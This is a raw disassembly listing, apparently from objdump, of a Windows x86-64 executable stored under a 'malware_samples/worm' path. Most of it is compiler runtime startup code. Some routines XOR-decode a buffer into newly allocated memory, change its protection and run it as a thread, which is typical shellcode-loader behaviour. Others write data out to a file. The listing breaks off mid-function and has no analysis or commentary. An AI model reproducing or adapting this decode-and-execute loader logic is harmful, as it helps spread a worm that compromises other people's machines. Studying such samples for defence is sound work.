
malware_samples/worm/3753bd723d6579204dc4b8ba60cceac1b0d4787c8daf686f114cdee60e93657d.exe:     file format pei-x86-64


Disassembly of section .text:

0000000000401000 <.text>:
  401000:	c3                   	ret
  401001:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  401008:	00 00 00 00 
  40100c:	0f 1f 40 00          	nopl   0x0(%rax)
  401010:	48 83 ec 28          	sub    $0x28,%rsp
  401014:	48 8b 05 c5 44 00 00 	mov    0x44c5(%rip),%rax        # 0x4054e0
  40101b:	31 c9                	xor    %ecx,%ecx
  40101d:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  401023:	48 8b 05 c6 44 00 00 	mov    0x44c6(%rip),%rax        # 0x4054f0
  40102a:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  401030:	48 8b 05 c9 44 00 00 	mov    0x44c9(%rip),%rax        # 0x405500
  401037:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  40103d:	48 8b 05 8c 44 00 00 	mov    0x448c(%rip),%rax        # 0x4054d0
  401044:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  40104a:	48 8b 05 5f 43 00 00 	mov    0x435f(%rip),%rax        # 0x4053b0
  401051:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
  401056:	75 0f                	jne    0x401067
  401058:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
  40105c:	48 01 d0             	add    %rdx,%rax
  40105f:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
  401065:	74 59                	je     0x4010c0
  401067:	48 8b 05 52 44 00 00 	mov    0x4452(%rip),%rax        # 0x4054c0
  40106e:	89 0d 98 6f 00 00    	mov    %ecx,0x6f98(%rip)        # 0x40800c
  401074:	8b 00                	mov    (%rax),%eax
  401076:	85 c0                	test   %eax,%eax
  401078:	75 36                	jne    0x4010b0
  40107a:	b9 01 00 00 00       	mov    $0x1,%ecx
  40107f:	e8 1c 1e 00 00       	call   0x402ea0
  401084:	e8 87 1e 00 00       	call   0x402f10
  401089:	48 8b 15 e0 43 00 00 	mov    0x43e0(%rip),%rdx        # 0x405470
  401090:	8b 12                	mov    (%rdx),%edx
  401092:	89 10                	mov    %edx,(%rax)
  401094:	e8 e7 08 00 00       	call   0x401980
  401099:	48 8b 05 c0 42 00 00 	mov    0x42c0(%rip),%rax        # 0x405360
  4010a0:	83 38 01             	cmpl   $0x1,(%rax)
  4010a3:	74 4b                	je     0x4010f0
  4010a5:	31 c0                	xor    %eax,%eax
  4010a7:	48 83 c4 28          	add    $0x28,%rsp
  4010ab:	c3                   	ret
  4010ac:	0f 1f 40 00          	nopl   0x0(%rax)
  4010b0:	b9 02 00 00 00       	mov    $0x2,%ecx
  4010b5:	e8 e6 1d 00 00       	call   0x402ea0
  4010ba:	eb c8                	jmp    0x401084
  4010bc:	0f 1f 40 00          	nopl   0x0(%rax)
  4010c0:	0f b7 50 18          	movzwl 0x18(%rax),%edx
  4010c4:	66 81 fa 0b 01       	cmp    $0x10b,%dx
  4010c9:	74 3d                	je     0x401108
  4010cb:	66 81 fa 0b 02       	cmp    $0x20b,%dx
  4010d0:	75 95                	jne    0x401067
  4010d2:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%rax)
  4010d9:	76 8c                	jbe    0x401067
  4010db:	8b 90 f8 00 00 00    	mov    0xf8(%rax),%edx
  4010e1:	31 c9                	xor    %ecx,%ecx
  4010e3:	85 d2                	test   %edx,%edx
  4010e5:	0f 95 c1             	setne  %cl
  4010e8:	e9 7a ff ff ff       	jmp    0x401067
  4010ed:	0f 1f 00             	nopl   (%rax)
  4010f0:	48 8d 0d 49 0b 00 00 	lea    0xb49(%rip),%rcx        # 0x401c40
  4010f7:	e8 14 12 00 00       	call   0x402310
  4010fc:	31 c0                	xor    %eax,%eax
  4010fe:	48 83 c4 28          	add    $0x28,%rsp
  401102:	c3                   	ret
  401103:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401108:	83 78 74 0e          	cmpl   $0xe,0x74(%rax)
  40110c:	0f 86 55 ff ff ff    	jbe    0x401067
  401112:	44 8b 80 e8 00 00 00 	mov    0xe8(%rax),%r8d
  401119:	31 c9                	xor    %ecx,%ecx
  40111b:	45 85 c0             	test   %r8d,%r8d
  40111e:	0f 95 c1             	setne  %cl
  401121:	e9 41 ff ff ff       	jmp    0x401067
  401126:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40112d:	00 00 00 
  401130:	48 83 ec 38          	sub    $0x38,%rsp
  401134:	48 8b 05 65 43 00 00 	mov    0x4365(%rip),%rax        # 0x4054a0
  40113b:	4c 8d 05 d6 6e 00 00 	lea    0x6ed6(%rip),%r8        # 0x408018
  401142:	48 8d 15 d7 6e 00 00 	lea    0x6ed7(%rip),%rdx        # 0x408020
  401149:	48 8d 0d d8 6e 00 00 	lea    0x6ed8(%rip),%rcx        # 0x408028
  401150:	8b 00                	mov    (%rax),%eax
  401152:	89 05 ac 6e 00 00    	mov    %eax,0x6eac(%rip)        # 0x408004
  401158:	48 8d 05 a5 6e 00 00 	lea    0x6ea5(%rip),%rax        # 0x408004
  40115f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  401164:	48 8b 05 f5 42 00 00 	mov    0x42f5(%rip),%rax        # 0x405460
  40116b:	44 8b 08             	mov    (%rax),%r9d
  40116e:	e8 3d 1d 00 00       	call   0x402eb0
  401173:	90                   	nop
  401174:	48 83 c4 38          	add    $0x38,%rsp
  401178:	c3                   	ret
  401179:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401180:	41 55                	push   %r13
  401182:	41 54                	push   %r12
  401184:	55                   	push   %rbp
  401185:	57                   	push   %rdi
  401186:	56                   	push   %rsi
  401187:	53                   	push   %rbx
  401188:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
  40118f:	b9 0d 00 00 00       	mov    $0xd,%ecx
  401194:	31 c0                	xor    %eax,%eax
  401196:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
  40119b:	4c 89 c7             	mov    %r8,%rdi
  40119e:	f3 48 ab             	rep stos %rax,(%rdi)
  4011a1:	48 8b 3d 18 43 00 00 	mov    0x4318(%rip),%rdi        # 0x4054c0
  4011a8:	44 8b 0f             	mov    (%rdi),%r9d
  4011ab:	45 85 c9             	test   %r9d,%r9d
  4011ae:	0f 85 ac 02 00 00    	jne    0x401460
  4011b4:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
  4011bb:	00 00 
  4011bd:	48 8b 1d 3c 42 00 00 	mov    0x423c(%rip),%rbx        # 0x405400
  4011c4:	48 8b 70 08          	mov    0x8(%rax),%rsi
  4011c8:	31 ed                	xor    %ebp,%ebp
  4011ca:	4c 8b 25 1b 81 00 00 	mov    0x811b(%rip),%r12        # 0x4092ec
  4011d1:	eb 16                	jmp    0x4011e9
  4011d3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4011d8:	48 39 c6             	cmp    %rax,%rsi
  4011db:	0f 84 1f 02 00 00    	je     0x401400
  4011e1:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
  4011e6:	41 ff d4             	call   *%r12
  4011e9:	48 89 e8             	mov    %rbp,%rax
  4011ec:	f0 48 0f b1 33       	lock cmpxchg %rsi,(%rbx)
  4011f1:	48 85 c0             	test   %rax,%rax
  4011f4:	75 e2                	jne    0x4011d8
  4011f6:	48 8b 35 13 42 00 00 	mov    0x4213(%rip),%rsi        # 0x405410
  4011fd:	31 ed                	xor    %ebp,%ebp
  4011ff:	8b 06                	mov    (%rsi),%eax
  401201:	83 f8 01             	cmp    $0x1,%eax
  401204:	0f 84 0d 02 00 00    	je     0x401417
  40120a:	8b 06                	mov    (%rsi),%eax
  40120c:	85 c0                	test   %eax,%eax
  40120e:	0f 84 7c 02 00 00    	je     0x401490
  401214:	c7 05 ea 6d 00 00 01 	movl   $0x1,0x6dea(%rip)        # 0x408008
  40121b:	00 00 00 
  40121e:	8b 06                	mov    (%rsi),%eax
  401220:	83 f8 01             	cmp    $0x1,%eax
  401223:	0f 84 03 02 00 00    	je     0x40142c
  401229:	85 ed                	test   %ebp,%ebp
  40122b:	0f 84 1c 02 00 00    	je     0x40144d
  401231:	48 8b 05 68 41 00 00 	mov    0x4168(%rip),%rax        # 0x4053a0
  401238:	48 8b 00             	mov    (%rax),%rax
  40123b:	48 85 c0             	test   %rax,%rax
  40123e:	74 0c                	je     0x40124c
  401240:	45 31 c0             	xor    %r8d,%r8d
  401243:	ba 02 00 00 00       	mov    $0x2,%edx
  401248:	31 c9                	xor    %ecx,%ecx
  40124a:	ff d0                	call   *%rax
  40124c:	e8 7f 0d 00 00       	call   0x401fd0
  401251:	48 8d 0d 88 13 00 00 	lea    0x1388(%rip),%rcx        # 0x4025e0
  401258:	ff 15 86 80 00 00    	call   *0x8086(%rip)        # 0x4092e4
  40125e:	48 8b 15 8b 41 00 00 	mov    0x418b(%rip),%rdx        # 0x4053f0
  401265:	48 89 02             	mov    %rax,(%rdx)
  401268:	e8 73 12 00 00       	call   0x4024e0
  40126d:	48 8d 0d 8c fd ff ff 	lea    -0x274(%rip),%rcx        # 0x401000
  401274:	e8 77 1c 00 00       	call   0x402ef0
  401279:	e8 c2 0a 00 00       	call   0x401d40
  40127e:	48 8b 05 2b 41 00 00 	mov    0x412b(%rip),%rax        # 0x4053b0
  401285:	48 89 05 dc 76 00 00 	mov    %rax,0x76dc(%rip)        # 0x408968
  40128c:	e8 6f 1c 00 00       	call   0x402f00
  401291:	31 c9                	xor    %ecx,%ecx
  401293:	48 8b 00             	mov    (%rax),%rax
  401296:	48 85 c0             	test   %rax,%rax
  401299:	75 17                	jne    0x4012b2
  40129b:	eb 53                	jmp    0x4012f0
  40129d:	0f 1f 00             	nopl   (%rax)
  4012a0:	84 d2                	test   %dl,%dl
  4012a2:	74 45                	je     0x4012e9
  4012a4:	83 e1 01             	and    $0x1,%ecx
  4012a7:	74 27                	je     0x4012d0
  4012a9:	b9 01 00 00 00       	mov    $0x1,%ecx
  4012ae:	48 83 c0 01          	add    $0x1,%rax
  4012b2:	0f b6 10             	movzbl (%rax),%edx
  4012b5:	80 fa 20             	cmp    $0x20,%dl
  4012b8:	7e e6                	jle    0x4012a0
  4012ba:	41 89 c8             	mov    %ecx,%r8d
  4012bd:	41 83 f0 01          	xor    $0x1,%r8d
  4012c1:	80 fa 22             	cmp    $0x22,%dl
  4012c4:	41 0f 44 c8          	cmove  %r8d,%ecx
  4012c8:	eb e4                	jmp    0x4012ae
  4012ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4012d0:	84 d2                	test   %dl,%dl
  4012d2:	74 15                	je     0x4012e9
  4012d4:	0f 1f 40 00          	nopl   0x0(%rax)
  4012d8:	0f b6 50 01          	movzbl 0x1(%rax),%edx
  4012dc:	48 83 c0 01          	add    $0x1,%rax
  4012e0:	84 d2                	test   %dl,%dl
  4012e2:	74 05                	je     0x4012e9
  4012e4:	80 fa 20             	cmp    $0x20,%dl
  4012e7:	7e ef                	jle    0x4012d8
  4012e9:	48 89 05 70 76 00 00 	mov    %rax,0x7670(%rip)        # 0x408960
  4012f0:	44 8b 07             	mov    (%rdi),%r8d
  4012f3:	45 85 c0             	test   %r8d,%r8d
  4012f6:	74 16                	je     0x40130e
  4012f8:	b8 0a 00 00 00       	mov    $0xa,%eax
  4012fd:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
  401302:	0f 85 e8 00 00 00    	jne    0x4013f0
  401308:	89 05 f2 2c 00 00    	mov    %eax,0x2cf2(%rip)        # 0x404000
  40130e:	8b 1d 14 6d 00 00    	mov    0x6d14(%rip),%ebx        # 0x408028
  401314:	44 8d 63 01          	lea    0x1(%rbx),%r12d
  401318:	4d 63 e4             	movslq %r12d,%r12
  40131b:	49 c1 e4 03          	shl    $0x3,%r12
  40131f:	4c 89 e1             	mov    %r12,%rcx
  401322:	e8 19 1b 00 00       	call   0x402e40
  401327:	4c 8b 2d f2 6c 00 00 	mov    0x6cf2(%rip),%r13        # 0x408020
  40132e:	48 89 c7             	mov    %rax,%rdi
  401331:	85 db                	test   %ebx,%ebx
  401333:	7e 46                	jle    0x40137b
  401335:	8d 6b ff             	lea    -0x1(%rbx),%ebp
  401338:	31 db                	xor    %ebx,%ebx
  40133a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401340:	49 8b 4c dd 00       	mov    0x0(%r13,%rbx,8),%rcx
  401345:	e8 d6 1a 00 00       	call   0x402e20
  40134a:	48 8d 70 01          	lea    0x1(%rax),%rsi
  40134e:	48 89 f1             	mov    %rsi,%rcx
  401351:	e8 ea 1a 00 00       	call   0x402e40
  401356:	49 89 f0             	mov    %rsi,%r8
  401359:	48 89 04 df          	mov    %rax,(%rdi,%rbx,8)
  40135d:	49 8b 54 dd 00       	mov    0x0(%r13,%rbx,8),%rdx
  401362:	48 89 c1             	mov    %rax,%rcx
  401365:	e8 ce 1a 00 00       	call   0x402e38
  40136a:	48 89 d8             	mov    %rbx,%rax
  40136d:	48 83 c3 01          	add    $0x1,%rbx
  401371:	48 39 c5             	cmp    %rax,%rbp
  401374:	75 ca                	jne    0x401340
  401376:	4a 8d 44 27 f8       	lea    -0x8(%rdi,%r12,1),%rax
  40137b:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  401382:	48 89 3d 97 6c 00 00 	mov    %rdi,0x6c97(%rip)        # 0x408020
  401389:	e8 c2 05 00 00       	call   0x401950
  40138e:	48 8b 05 2b 40 00 00 	mov    0x402b(%rip),%rax        # 0x4053c0
  401395:	4c 8b 05 7c 6c 00 00 	mov    0x6c7c(%rip),%r8        # 0x408018
  40139c:	8b 0d 86 6c 00 00    	mov    0x6c86(%rip),%ecx        # 0x408028
  4013a2:	48 8b 00             	mov    (%rax),%rax
  4013a5:	4c 89 00             	mov    %r8,(%rax)
  4013a8:	48 8b 15 71 6c 00 00 	mov    0x6c71(%rip),%rdx        # 0x408020
  4013af:	e8 8c 1c 00 00       	call   0x403040
  4013b4:	8b 0d 52 6c 00 00    	mov    0x6c52(%rip),%ecx        # 0x40800c
  4013ba:	89 05 50 6c 00 00    	mov    %eax,0x6c50(%rip)        # 0x408010
  4013c0:	85 c9                	test   %ecx,%ecx
  4013c2:	0f 84 e6 00 00 00    	je     0x4014ae
  4013c8:	8b 15 3a 6c 00 00    	mov    0x6c3a(%rip),%edx        # 0x408008
  4013ce:	85 d2                	test   %edx,%edx
  4013d0:	0f 84 9a 00 00 00    	je     0x401470
  4013d6:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
  4013dd:	5b                   	pop    %rbx
  4013de:	5e                   	pop    %rsi
  4013df:	5f                   	pop    %rdi
  4013e0:	5d                   	pop    %rbp
  4013e1:	41 5c                	pop    %r12
  4013e3:	41 5d                	pop    %r13
  4013e5:	c3                   	ret
  4013e6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4013ed:	00 00 00 
  4013f0:	0f b7 44 24 60       	movzwl 0x60(%rsp),%eax
  4013f5:	e9 0e ff ff ff       	jmp    0x401308
  4013fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401400:	48 8b 35 09 40 00 00 	mov    0x4009(%rip),%rsi        # 0x405410
  401407:	bd 01 00 00 00       	mov    $0x1,%ebp
  40140c:	8b 06                	mov    (%rsi),%eax
  40140e:	83 f8 01             	cmp    $0x1,%eax
  401411:	0f 85 f3 fd ff ff    	jne    0x40120a
  401417:	b9 1f 00 00 00       	mov    $0x1f,%ecx
  40141c:	e8 6f 1a 00 00       	call   0x402e90
  401421:	8b 06                	mov    (%rsi),%eax
  401423:	83 f8 01             	cmp    $0x1,%eax
  401426:	0f 85 fd fd ff ff    	jne    0x401229
  40142c:	48 8b 15 fd 3f 00 00 	mov    0x3ffd(%rip),%rdx        # 0x405430
  401433:	48 8b 0d e6 3f 00 00 	mov    0x3fe6(%rip),%rcx        # 0x405420
  40143a:	e8 41 1a 00 00       	call   0x402e80
  40143f:	c7 06 02 00 00 00    	movl   $0x2,(%rsi)
  401445:	85 ed                	test   %ebp,%ebp
  401447:	0f 85 e4 fd ff ff    	jne    0x401231
  40144d:	31 c0                	xor    %eax,%eax
  40144f:	48 87 03             	xchg   %rax,(%rbx)
  401452:	e9 da fd ff ff       	jmp    0x401231
  401457:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40145e:	00 00 
  401460:	4c 89 c1             	mov    %r8,%rcx
  401463:	ff 15 23 7e 00 00    	call   *0x7e23(%rip)        # 0x40928c
  401469:	e9 46 fd ff ff       	jmp    0x4011b4
  40146e:	66 90                	xchg   %ax,%ax
  401470:	e8 13 1a 00 00       	call   0x402e88
  401475:	8b 05 95 6b 00 00    	mov    0x6b95(%rip),%eax        # 0x408010
  40147b:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
  401482:	5b                   	pop    %rbx
  401483:	5e                   	pop    %rsi
  401484:	5f                   	pop    %rdi
  401485:	5d                   	pop    %rbp
  401486:	41 5c                	pop    %r12
  401488:	41 5d                	pop    %r13
  40148a:	c3                   	ret
  40148b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401490:	48 8b 15 b9 3f 00 00 	mov    0x3fb9(%rip),%rdx        # 0x405450
  401497:	48 8b 0d a2 3f 00 00 	mov    0x3fa2(%rip),%rcx        # 0x405440
  40149e:	c7 06 01 00 00 00    	movl   $0x1,(%rsi)
  4014a4:	e8 d7 19 00 00       	call   0x402e80
  4014a9:	e9 70 fd ff ff       	jmp    0x40121e
  4014ae:	89 c1                	mov    %eax,%ecx
  4014b0:	e8 ab 19 00 00       	call   0x402e60
  4014b5:	90                   	nop
  4014b6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4014bd:	00 00 00 
  4014c0:	48 83 ec 28          	sub    $0x28,%rsp
  4014c4:	48 8b 05 f5 3f 00 00 	mov    0x3ff5(%rip),%rax        # 0x4054c0
  4014cb:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  4014d1:	e8 ba 04 00 00       	call   0x401990
  4014d6:	e8 a5 fc ff ff       	call   0x401180
  4014db:	90                   	nop
  4014dc:	90                   	nop
  4014dd:	48 83 c4 28          	add    $0x28,%rsp
  4014e1:	c3                   	ret
  4014e2:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  4014e9:	00 00 00 00 
  4014ed:	0f 1f 00             	nopl   (%rax)
  4014f0:	48 83 ec 28          	sub    $0x28,%rsp
  4014f4:	48 8b 05 c5 3f 00 00 	mov    0x3fc5(%rip),%rax        # 0x4054c0
  4014fb:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
  401501:	e8 8a 04 00 00       	call   0x401990
  401506:	e8 75 fc ff ff       	call   0x401180
  40150b:	90                   	nop
  40150c:	90                   	nop
  40150d:	48 83 c4 28          	add    $0x28,%rsp
  401511:	c3                   	ret
  401512:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  401519:	00 00 00 00 
  40151d:	0f 1f 00             	nopl   (%rax)
  401520:	48 83 ec 28          	sub    $0x28,%rsp
  401524:	e8 4f 19 00 00       	call   0x402e78
  401529:	48 85 c0             	test   %rax,%rax
  40152c:	0f 94 c0             	sete   %al
  40152f:	0f b6 c0             	movzbl %al,%eax
  401532:	f7 d8                	neg    %eax
  401534:	48 83 c4 28          	add    $0x28,%rsp
  401538:	c3                   	ret
  401539:	90                   	nop
  40153a:	90                   	nop
  40153b:	90                   	nop
  40153c:	90                   	nop
  40153d:	90                   	nop
  40153e:	90                   	nop
  40153f:	90                   	nop
  401540:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x401550
  401547:	e9 d4 ff ff ff       	jmp    0x401520
  40154c:	0f 1f 40 00          	nopl   0x0(%rax)
  401550:	c3                   	ret
  401551:	90                   	nop
  401552:	90                   	nop
  401553:	90                   	nop
  401554:	90                   	nop
  401555:	90                   	nop
  401556:	90                   	nop
  401557:	90                   	nop
  401558:	90                   	nop
  401559:	90                   	nop
  40155a:	90                   	nop
  40155b:	90                   	nop
  40155c:	90                   	nop
  40155d:	90                   	nop
  40155e:	90                   	nop
  40155f:	90                   	nop
  401560:	48 ff e1             	rex.W jmp *%rcx
  401563:	48 63 05 c2 2a 00 00 	movslq 0x2ac2(%rip),%rax        # 0x40402c
  40156a:	85 c0                	test   %eax,%eax
  40156c:	7e 26                	jle    0x401594
  40156e:	83 3d bb 2a 00 00 00 	cmpl   $0x0,0x2abb(%rip)        # 0x404030
  401575:	7e 1d                	jle    0x401594
  401577:	48 8b 15 fe 7c 00 00 	mov    0x7cfe(%rip),%rdx        # 0x40927c
  40157e:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
  401582:	48 8b 15 fb 7c 00 00 	mov    0x7cfb(%rip),%rdx        # 0x409284
  401589:	48 63 05 a0 2a 00 00 	movslq 0x2aa0(%rip),%rax        # 0x404030
  401590:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
  401594:	c3                   	ret
  401595:	41 54                	push   %r12
  401597:	55                   	push   %rbp
  401598:	57                   	push   %rdi
  401599:	56                   	push   %rsi
  40159a:	53                   	push   %rbx
  40159b:	48 83 ec 40          	sub    $0x40,%rsp
  40159f:	41 b9 04 00 00 00    	mov    $0x4,%r9d
  4015a5:	4c 63 e2             	movslq %edx,%r12
  4015a8:	48 89 cf             	mov    %rcx,%rdi
  4015ab:	4c 89 c5             	mov    %r8,%rbp
  4015ae:	31 c9                	xor    %ecx,%ecx
  4015b0:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
  4015b6:	4c 89 e2             	mov    %r12,%rdx
  4015b9:	4c 89 e6             	mov    %r12,%rsi
  4015bc:	ff 15 4a 7d 00 00    	call   *0x7d4a(%rip)        # 0x40930c
  4015c2:	48 89 c3             	mov    %rax,%rbx
  4015c5:	31 c0                	xor    %eax,%eax
  4015c7:	39 c6                	cmp    %eax,%esi
  4015c9:	7e 15                	jle    0x4015e0
  4015cb:	48 89 c2             	mov    %rax,%rdx
  4015ce:	83 e2 03             	and    $0x3,%edx
  4015d1:	8a 54 15 00          	mov    0x0(%rbp,%rdx,1),%dl
  4015d5:	32 14 07             	xor    (%rdi,%rax,1),%dl
  4015d8:	88 14 03             	mov    %dl,(%rbx,%rax,1)
  4015db:	48 ff c0             	inc    %rax
  4015de:	eb e7                	jmp    0x4015c7
  4015e0:	48 89 d9             	mov    %rbx,%rcx
  4015e3:	e8 7b ff ff ff       	call   0x401563
  4015e8:	4c 8d 4c 24 3c       	lea    0x3c(%rsp),%r9
  4015ed:	4c 89 e2             	mov    %r12,%rdx
  4015f0:	41 b8 20 00 00 00    	mov    $0x20,%r8d
  4015f6:	ff 15 18 7d 00 00    	call   *0x7d18(%rip)        # 0x409314
  4015fc:	49 89 d9             	mov    %rbx,%r9
  4015ff:	31 d2                	xor    %edx,%edx
  401601:	31 c9                	xor    %ecx,%ecx
  401603:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
  40160a:	00 00 
  40160c:	4c 8d 05 4d ff ff ff 	lea    -0xb3(%rip),%r8        # 0x401560
  401613:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
  40161a:	00 
  40161b:	ff 15 23 7c 00 00    	call   *0x7c23(%rip)        # 0x409244
  401621:	90                   	nop
  401622:	48 83 c4 40          	add    $0x40,%rsp
  401626:	5b                   	pop    %rbx
  401627:	5e                   	pop    %rsi
  401628:	5f                   	pop    %rdi
  401629:	5d                   	pop    %rbp
  40162a:	41 5c                	pop    %r12
  40162c:	c3                   	ret
  40162d:	90                   	nop
  40162e:	90                   	nop
  40162f:	90                   	nop
  401630:	41 54                	push   %r12
  401632:	57                   	push   %rdi
  401633:	56                   	push   %rsi
  401634:	53                   	push   %rbx
  401635:	48 83 ec 58          	sub    $0x58,%rsp
  401639:	41 b9 01 00 00 00    	mov    $0x1,%r9d
  40163f:	45 31 c0             	xor    %r8d,%r8d
  401642:	c7 44 24 4c 00 00 00 	movl   $0x0,0x4c(%rsp)
  401649:	00 
  40164a:	48 89 ce             	mov    %rcx,%rsi
  40164d:	89 d3                	mov    %edx,%ebx
  40164f:	48 8d 0d 2a 73 00 00 	lea    0x732a(%rip),%rcx        # 0x408980
  401656:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
  40165d:	00 00 
  40165f:	ba 02 00 00 00       	mov    $0x2,%edx
  401664:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
  40166b:	00 
  40166c:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
  401673:	00 
  401674:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
  40167b:	00 
  40167c:	ff 15 ba 7b 00 00    	call   *0x7bba(%rip)        # 0x40923c
  401682:	49 89 c4             	mov    %rax,%r12
  401685:	48 8d 40 ff          	lea    -0x1(%rax),%rax
  401689:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
  40168d:	77 4d                	ja     0x4016dc
  40168f:	31 d2                	xor    %edx,%edx
  401691:	4c 89 e1             	mov    %r12,%rcx
  401694:	48 8d 7c 24 4c       	lea    0x4c(%rsp),%rdi
  401699:	ff 15 8d 7b 00 00    	call   *0x7b8d(%rip)        # 0x40922c
  40169f:	85 c0                	test   %eax,%eax
  4016a1:	74 39                	je     0x4016dc
  4016a3:	85 db                	test   %ebx,%ebx
  4016a5:	7e 1f                	jle    0x4016c6
  4016a7:	49 89 f9             	mov    %rdi,%r9
  4016aa:	41 89 d8             	mov    %ebx,%r8d
  4016ad:	48 89 f2             	mov    %rsi,%rdx
  4016b0:	4c 89 e1             	mov    %r12,%rcx
  4016b3:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  4016ba:	00 00 
  4016bc:	ff 15 62 7c 00 00    	call   *0x7c62(%rip)        # 0x409324
  4016c2:	85 c0                	test   %eax,%eax
  4016c4:	75 0b                	jne    0x4016d1
  4016c6:	4c 89 e1             	mov    %r12,%rcx
  4016c9:	ff 15 55 7b 00 00    	call   *0x7b55(%rip)        # 0x409224
  4016cf:	eb 0b                	jmp    0x4016dc
  4016d1:	8b 54 24 4c          	mov    0x4c(%rsp),%edx
  4016d5:	48 01 d6             	add    %rdx,%rsi
  4016d8:	29 d3                	sub    %edx,%ebx
  4016da:	eb c7                	jmp    0x4016a3
  4016dc:	48 83 c4 58          	add    $0x58,%rsp
  4016e0:	5b                   	pop    %rbx
  4016e1:	5e                   	pop    %rsi
  4016e2:	5f                   	pop    %rdi
  4016e3:	41 5c                	pop    %r12
  4016e5:	c3                   	ret
  4016e6:	48 83 ec 28          	sub    $0x28,%rsp
  4016ea:	48 8b 0d bf 3d 00 00 	mov    0x3dbf(%rip),%rcx        # 0x4054b0
  4016f1:	8b 51 04             	mov    0x4(%rcx),%edx
  4016f4:	48 83 c1 14          	add    $0x14,%rcx
  4016f8:	e8 33 ff ff ff       	call   0x401630
  4016fd:	31 c0                	xor    %eax,%eax
  4016ff:	48 83 c4 28          	add    $0x28,%rsp
  401703:	c3                   	ret
  401704:	41 54                	push   %r12
  401706:	57                   	push   %rdi
  401707:	56                   	push   %rsi
  401708:	53                   	push   %rbx
  401709:	48 83 ec 58          	sub    $0x58,%rsp
  40170d:	45 31 c9             	xor    %r9d,%r9d
  401710:	41 b8 03 00 00 00    	mov    $0x3,%r8d
  401716:	c7 44 24 4c 00 00 00 	movl   $0x0,0x4c(%rsp)
  40171d:	00 
  40171e:	48 89 ce             	mov    %rcx,%rsi
  401721:	89 d3                	mov    %edx,%ebx
  401723:	48 8d 0d 56 72 00 00 	lea    0x7256(%rip),%rcx        # 0x408980
  40172a:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
  401731:	00 00 
  401733:	ba 00 00 00 80       	mov    $0x80000000,%edx
  401738:	48 8d 7c 24 4c       	lea    0x4c(%rsp),%rdi
  40173d:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
  401744:	00 
  401745:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
  40174c:	00 
  40174d:	ff 15 e1 7a 00 00    	call   *0x7ae1(%rip)        # 0x409234
  401753:	49 89 c4             	mov    %rax,%r12
  401756:	31 c0                	xor    %eax,%eax
  401758:	49 83 fc ff          	cmp    $0xffffffffffffffff,%r12
  40175c:	74 3e                	je     0x40179c
  40175e:	85 db                	test   %ebx,%ebx
  401760:	7e 1f                	jle    0x401781
  401762:	49 89 f9             	mov    %rdi,%r9
  401765:	41 89 d8             	mov    %ebx,%r8d
  401768:	48 89 f2             	mov    %rsi,%rdx
  40176b:	4c 89 e1             	mov    %r12,%rcx
  40176e:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  401775:	00 00 
  401777:	ff 15 3f 7b 00 00    	call   *0x7b3f(%rip)        # 0x4092bc
  40177d:	85 c0                	test   %eax,%eax
  40177f:	75 10                	jne    0x401791
  401781:	4c 89 e1             	mov    %r12,%rcx
  401784:	ff 15 9a 7a 00 00    	call   *0x7a9a(%rip)        # 0x409224
  40178a:	b8 01 00 00 00       	mov    $0x1,%eax
  40178f:	eb 0b                	jmp    0x40179c
  401791:	8b 54 24 4c          	mov    0x4c(%rsp),%edx
  401795:	48 01 d6             	add    %rdx,%rsi
  401798:	29 d3                	sub    %edx,%ebx
  40179a:	eb c2                	jmp    0x40175e
  40179c:	48 83 c4 58          	add    $0x58,%rsp
  4017a0:	5b                   	pop    %rbx
  4017a1:	5e                   	pop    %rsi
  4017a2:	5f                   	pop    %rdi
